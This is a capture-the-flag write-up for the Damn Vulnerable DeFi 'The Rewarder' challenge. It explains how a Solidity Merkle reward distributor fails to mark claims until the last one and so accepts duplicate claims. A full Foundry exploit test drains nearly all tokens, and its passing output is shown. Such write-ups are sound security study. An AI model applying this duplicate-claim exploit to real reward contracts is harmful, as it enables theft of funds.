# Challenge - The Rewarder

A contract is distributing rewards of Damn Valuable Tokens and WETH.

To claim rewards, users must prove they’re included in the chosen set of beneficiaries. Don’t worry about gas though. The contract has been optimized and allows claiming multiple tokens in the same transaction.

Alice has claimed her rewards already. You can claim yours too! But you’ve realized there’s a critical vulnerability in the contract.

## Objective of CTF

Save as much funds as you can from the distributor. Transfer all recovered assets to the designated recovery account.

## Vulnerability Analysis

The `TheRewarderDistributor` contract implement the claim rewards logic as follow:

```solidity
function claimRewards(Claim[] memory inputClaims, IERC20[] memory inputTokens) external {
    Claim memory inputClaim;
    IERC20 token;
    uint256 bitsSet; // accumulator
    uint256 amount;

    for (uint256 i = 0; i < inputClaims.length; i++) {
        inputClaim = inputClaims[i];

        uint256 wordPosition = inputClaim.batchNumber / 256;
        uint256 bitPosition = inputClaim.batchNumber % 256;

        if (token != inputTokens[inputClaim.tokenIndex]) {
            if (address(token) != address(0)) {
                if (!_setClaimed(token, amount, wordPosition, bitsSet)) revert AlreadyClaimed();
            }

            token = inputTokens[inputClaim.tokenIndex];
            bitsSet = 1 << bitPosition; // set bit at given position
            amount = inputClaim.amount;
        } else {
            bitsSet = bitsSet | 1 << bitPosition;
            amount += inputClaim.amount;
        }

        // for the last claim
        if (i == inputClaims.length - 1) {
            if (!_setClaimed(token, amount, wordPosition, bitsSet)) revert AlreadyClaimed();
        }

        bytes32 leaf = keccak256(abi.encodePacked(msg.sender, inputClaim.amount));
        bytes32 root = distributions[token].roots[inputClaim.batchNumber];

        if (!MerkleProof.verify(inputClaim.proof, root, leaf)) revert InvalidProof();

        inputTokens[inputClaim.tokenIndex].transfer(msg.sender, inputClaim.amount);
    }
}
```

This function allows multiple tokens to be claimed at once. The function processes each claim request as follows:

-   It first validates the input data.
-   It then verifies the Merkle proof. If the proof is valid, the function transfers the reward tokens to the caller.
-   Finally, it marks the token as claimed when processing the last request.

However, there is a logical flaw in how the claim status is updated. The function only updates the claim status when handling the last request and does not enforce that each token request must be unique. As a result, an attacker can exploit this by submitting an array of claims that include duplicate valid token claims, allowing them to claim the remaining rewards multiple times with only a single valid proof.

### Attack steps:

1. Construct an array of duplicate token claims and call the `claimRewards` function to claim additional rewards.
2. Transfer all the claimed rewards to the recovery address.

## PoC test case

```solidity
// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {Merkle} from "murky/Merkle.sol";
import {WETH} from "solmate/tokens/WETH.sol";
import {TheRewarderDistributor, IERC20, Distribution, Claim} from "../../src/the-rewarder/TheRewarderDistributor.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";

contract TheRewarderChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address alice = makeAddr("alice");
    address recovery = makeAddr("recovery");

    uint256 constant BENEFICIARIES_AMOUNT = 1000;
    uint256 constant TOTAL_DVT_DISTRIBUTION_AMOUNT = 10 ether;
    uint256 constant TOTAL_WETH_DISTRIBUTION_AMOUNT = 1 ether;

    // Alice is the address at index 2 in the distribution files
    uint256 constant ALICE_DVT_CLAIM_AMOUNT = 2502024387994809;
    uint256 constant ALICE_WETH_CLAIM_AMOUNT = 228382988128225;

    TheRewarderDistributor distributor;

    // Instance of Murky's contract to handle Merkle roots, proofs, etc.
    Merkle merkle;

    // Distribution data for Damn Valuable Token (DVT)
    DamnValuableToken dvt;
    bytes32 dvtRoot;

    // Distribution data for WETH
    WETH weth;
    bytes32 wethRoot;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);

        // Deploy tokens to be distributed
        dvt = new DamnValuableToken();
        weth = new WETH();
        weth.deposit{value: TOTAL_WETH_DISTRIBUTION_AMOUNT}();

        // Calculate roots for DVT and WETH distributions
        bytes32[] memory dvtLeaves = _loadRewards("/test/the-rewarder/dvt-distribution.json");
        bytes32[] memory wethLeaves = _loadRewards("/test/the-rewarder/weth-distribution.json");
        merkle = new Merkle();
        dvtRoot = merkle.getRoot(dvtLeaves);
        wethRoot = merkle.getRoot(wethLeaves);

        // Deploy distributor
        distributor = new TheRewarderDistributor();

        // Create DVT distribution
        dvt.approve(address(distributor), TOTAL_DVT_DISTRIBUTION_AMOUNT);
        distributor.createDistribution({
            token: IERC20(address(dvt)),
            newRoot: dvtRoot,
            amount: TOTAL_DVT_DISTRIBUTION_AMOUNT
        });

        // Create WETH distribution
        weth.approve(address(distributor), TOTAL_WETH_DISTRIBUTION_AMOUNT);
        distributor.createDistribution({
            token: IERC20(address(weth)),
            newRoot: wethRoot,
            amount: TOTAL_WETH_DISTRIBUTION_AMOUNT
        });

        // Let's claim rewards for Alice.

        // Set DVT and WETH as tokens to claim
        IERC20[] memory tokensToClaim = new IERC20[](2);
        tokensToClaim[0] = IERC20(address(dvt));
        tokensToClaim[1] = IERC20(address(weth));

        // Create Alice's claims
        Claim[] memory claims = new Claim[](2);

        // First, the DVT claim
        claims[0] = Claim({
            batchNumber: 0, // claim corresponds to first DVT batch
            amount: ALICE_DVT_CLAIM_AMOUNT,
            tokenIndex: 0, // claim corresponds to first token in `tokensToClaim` array
            proof: merkle.getProof(dvtLeaves, 2) // Alice's address is at index 2
        });

        // And then, the WETH claim
        claims[1] = Claim({
            batchNumber: 0, // claim corresponds to first WETH batch
            amount: ALICE_WETH_CLAIM_AMOUNT,
            tokenIndex: 1, // claim corresponds to second token in `tokensToClaim` array
            proof: merkle.getProof(wethLeaves, 2) // Alice's address is at index 2
        });

        // Alice claims once
        vm.startPrank(alice);
        distributor.claimRewards({inputClaims: claims, inputTokens: tokensToClaim});

        // Alice cannot claim twice
        vm.expectRevert(TheRewarderDistributor.AlreadyClaimed.selector);
        distributor.claimRewards({inputClaims: claims, inputTokens: tokensToClaim});
        vm.stopPrank(); // stop alice prank

        vm.stopPrank(); // stop deployer prank
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        // Deployer owns distributor
        assertEq(distributor.owner(), deployer);

        // Batches created with expected roots
        assertEq(distributor.getNextBatchNumber(address(dvt)), 1);
        assertEq(distributor.getRoot(address(dvt), 0), dvtRoot);
        assertEq(distributor.getNextBatchNumber(address(weth)), 1);
        assertEq(distributor.getRoot(address(weth), 0), wethRoot);

        // Alice claimed tokens
        assertEq(dvt.balanceOf(alice), ALICE_DVT_CLAIM_AMOUNT);
        assertEq(weth.balanceOf(alice), ALICE_WETH_CLAIM_AMOUNT);

        // After Alice's claim, distributor still has enough tokens to distribute
        uint256 expectedDVTLeft = TOTAL_DVT_DISTRIBUTION_AMOUNT - ALICE_DVT_CLAIM_AMOUNT;
        assertEq(dvt.balanceOf(address(distributor)), expectedDVTLeft);
        assertEq(distributor.getRemaining(address(dvt)), expectedDVTLeft);

        uint256 expectedWETHLeft = TOTAL_WETH_DISTRIBUTION_AMOUNT - ALICE_WETH_CLAIM_AMOUNT;
        assertEq(weth.balanceOf(address(distributor)), expectedWETHLeft);
        assertEq(distributor.getRemaining(address(weth)), expectedWETHLeft);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_theRewarder() public checkSolvedByPlayer {
        bytes32[] memory dvtLeaves = _loadRewards("/test/the-rewarder/dvt-distribution.json");
        bytes32[] memory wethLeaves = _loadRewards("/test/the-rewarder/weth-distribution.json");

        uint256 player_DVT_CLAIM_AMOUNT = 11524763827831882;
        uint256 player_WETH_CLAIM_AMOUNT = 1171088749244340;

        uint256 dvt_iteration = dvt.balanceOf(address(distributor)) / player_DVT_CLAIM_AMOUNT;
        uint256 weth_iteration = weth.balanceOf(address(distributor)) / player_WETH_CLAIM_AMOUNT;
        uint256 total_iteration = dvt_iteration + weth_iteration;

        IERC20[] memory tokensToClaim = new IERC20[](2);
        tokensToClaim[0] = IERC20(address(dvt));
        tokensToClaim[1] = IERC20(address(weth));

        Claim[] memory claims = new Claim[](total_iteration);
        bytes32[] memory dvtProof = merkle.getProof(dvtLeaves, 188); // player's address is at index 188
        bytes32[] memory wethProof = merkle.getProof(wethLeaves, 188); // player's address is at index 188

        for (uint256 i; i < total_iteration; ++i) {
            if (i < dvt_iteration) {
                claims[i] = Claim({batchNumber: 0, amount: player_DVT_CLAIM_AMOUNT, tokenIndex: 0, proof: dvtProof});
            } else {
                claims[i] = Claim({batchNumber: 0, amount: player_WETH_CLAIM_AMOUNT, tokenIndex: 1, proof: wethProof});
            }
        }

        emit log("-------------------------- Before exploit --------------------------");
        emit log_named_decimal_uint(
            "DVT token balance in the distributor contract", dvt.balanceOf(address(distributor)), dvt.decimals()
        );
        emit log_named_decimal_uint(
            "WETH token balance in the distributor contract", weth.balanceOf(address(distributor)), weth.decimals()
        );
        emit log_named_decimal_uint(
            "DVT token balance in the recovery address", dvt.balanceOf(address(recovery)), dvt.decimals()
        );
        emit log_named_decimal_uint(
            "WETH token balance in the recovery address", weth.balanceOf(address(recovery)), weth.decimals()
        );

        distributor.claimRewards({inputClaims: claims, inputTokens: tokensToClaim});

        // Transfer the rescue tokens to the recovery address
        uint256 dvtPlayerBalance = dvt.balanceOf(player);
        uint256 wethPlayerBalance = weth.balanceOf(player);
        dvt.transfer(recovery, dvtPlayerBalance);
        weth.transfer(recovery, wethPlayerBalance);

        emit log("-------------------------- After exploit --------------------------");
        emit log_named_decimal_uint(
            "DVT token balance in the distributor contract", dvt.balanceOf(address(distributor)), dvt.decimals()
        );
        emit log_named_decimal_uint(
            "WETH token balance in the distributor contract", weth.balanceOf(address(distributor)), weth.decimals()
        );
        emit log_named_decimal_uint(
            "DVT token balance in the recovery address", dvt.balanceOf(address(recovery)), dvt.decimals()
        );
        emit log_named_decimal_uint(
            "WETH token balance in the recovery address", weth.balanceOf(address(recovery)), weth.decimals()
        );
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player saved as much funds as possible, perhaps leaving some dust
        assertLt(dvt.balanceOf(address(distributor)), 1e16, "Too much DVT in distributor");
        assertLt(weth.balanceOf(address(distributor)), 1e15, "Too much WETH in distributor");

        // All funds sent to the designated recovery account
        assertEq(
            dvt.balanceOf(recovery),
            TOTAL_DVT_DISTRIBUTION_AMOUNT - ALICE_DVT_CLAIM_AMOUNT - dvt.balanceOf(address(distributor)),
            "Not enough DVT in recovery account"
        );
        assertEq(
            weth.balanceOf(recovery),
            TOTAL_WETH_DISTRIBUTION_AMOUNT - ALICE_WETH_CLAIM_AMOUNT - weth.balanceOf(address(distributor)),
            "Not enough WETH in recovery account"
        );
    }

    struct Reward {
        address beneficiary;
        uint256 amount;
    }

    // Utility function to read rewards file and load it into an array of leaves
    function _loadRewards(string memory path) private view returns (bytes32[] memory leaves) {
        Reward[] memory rewards =
            abi.decode(vm.parseJson(vm.readFile(string.concat(vm.projectRoot(), path))), (Reward[]));
        assertEq(rewards.length, BENEFICIARIES_AMOUNT);

        leaves = new bytes32[](BENEFICIARIES_AMOUNT);
        for (uint256 i = 0; i < BENEFICIARIES_AMOUNT; i++) {
            leaves[i] = keccak256(abi.encodePacked(rewards[i].beneficiary, rewards[i].amount));
        }
    }
}
```

### Test Result

```
Ran 2 tests for test/the-rewarder/TheRewarder.t.sol:TheRewarderChallenge
[PASS] test_assertInitialState() (gas: 61631)
[PASS] test_theRewarder() (gas: 38100329)
Logs:
  -------------------------- Before exploit --------------------------
  DVT token balance in the distributor contract: 9.997497975612005191
  WETH token balance in the distributor contract: 0.999771617011871775
  DVT token balance in the recovery address: 0.000000000000000000
  WETH token balance in the recovery address: 0.000000000000000000
  -------------------------- After exploit --------------------------
  DVT token balance in the distributor contract: 0.005527736881763497
  WETH token balance in the distributor contract: 0.000832913906449755
  DVT token balance in the recovery address: 9.991970238730241694
  WETH token balance in the recovery address: 0.998938703105422020

Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 92.24ms (71.45ms CPU time)

Ran 1 test suite in 337.30ms (92.24ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
```
